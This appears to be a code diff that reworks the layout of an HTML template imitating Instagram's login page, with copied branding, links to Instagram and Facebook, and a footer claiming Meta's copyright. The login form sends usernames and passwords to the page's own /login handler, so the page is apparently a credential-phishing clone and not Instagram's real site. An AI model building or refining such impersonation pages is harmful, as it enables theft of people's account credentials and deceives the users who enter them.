@@ -14,26 +14,50 @@
     .container {
       display: flex;
       flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .content-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
     }
 
     .left-image {
       display: none;
-      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvzUKJ76Qe5oxTm2TCMU819FCn3GpxCXUKQw&usqp=CAU');
-      background-size: cover;
-      background-position: center;
-      flex: 1;
     }
 
     @media(min-width: 768px) {
       .container {
         flex-direction: row;
+        justify-content: center;
+        align-items: center;
         min-height: 100vh;
       }
+
+      .content-wrapper {
+        flex-direction: row;
+        max-width: none;
+        width: auto;
+        border: 1px solid #dbdbdb;
+        background-color: #fff;
+      }
+
       .left-image {
         display: block;
+        width: 250px;
+        height: auto;
+        background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvzUKJ76Qe5oxTm2TCMU819FCn3GpxCXUKQw&usqp=CAU');
+        background-size: cover;
+        background-position: center;
+        flex-shrink: 0;
       }
-      .right-form {
-        flex: 1;
+
+      .login-container {
+        border-left: 1px solid #dbdbdb;
       }
     }
 
@@ -41,17 +65,18 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 40px 20px;
+      padding: 20px;
+      flex: 1;
     }
 
     .login-container {
-      max-width: 350px;
       width: 100%;
-      border: 1px solid #dbdbdb;
+      max-width: 350px;
       background-color: #fff;
       padding: 40px 40px 20px;
       text-align: center;
       margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
     }
 
     .logo img {
@@ -201,46 +226,48 @@
 </head>
 <body>
   <div class="container">
-    <div class="left-image"></div>
-    <div class="right-form">
-      <div class="login-container">
-        <div class="logo">
-          <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" alt="Instagram Logo">
-        </div>
-        {% if error %}
-        <div class="error-message">{{ error }}</div>
-        {% endif %}
-        <form id="loginForm" action="/login" method="POST">
-          <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
-          <div class="password-field">
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <span class="toggle-password" onclick="togglePassword()">Show</span>
+    <div class="content-wrapper">
+      <div class="left-image"></div>
+      <div class="right-form">
+        <div class="login-container">
+          <div class="logo">
+            <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" alt="Instagram Logo">
           </div>
-          <button id="loginBtn" type="submit" disabled>Log In</button>
-        </form>
-        <div class="forgot">
-          <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
+          {% if error %}
+          <div class="error-message">{{ error }}</div>
+          {% endif %}
+          <form id="loginForm" action="/login" method="POST">
+            <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
+            <div class="password-field">
+              <input type="password" id="password" name="password" placeholder="Password" required>
+              <span class="toggle-password" onclick="togglePassword()">Show</span>
+            </div>
+            <button id="loginBtn" type="submit" disabled>Log In</button>
+          </form>
+          <div class="forgot">
+            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
+          </div>
+          <div class="divider">OR</div>
+          <a class="fb-login" href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a>
         </div>
-        <div class="divider">OR</div>
-        <a class="fb-login" href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a>
-      </div>
-      <div class="signup">
-        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
-      </div>
-      <div class="get-app">
-        Get the app.
-        <div class="app-badges">
-          <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
-          </a>
-          <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1280px-Download_on_the_App_Store_Badge.svg.png" alt="Download on the App Store">
-          </a>
+        <div class="signup">
+          Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
         </div>
+        <div class="get-app">
+          Get the app.
+          <div class="app-badges">
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+            </a>
+            <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1280px-Download_on_the_App_Store_Badge.svg.png" alt="Download on the App Store">
+            </a>
+          </div>
+        </div>
+        <footer>
+          © 2025 Instagram from Meta • All rights reserved.
+        </footer>
       </div>
-      <footer>
-        © 2025 Instagram from Meta • All rights reserved.
-      </footer>
     </div>
   </div>
   <script>
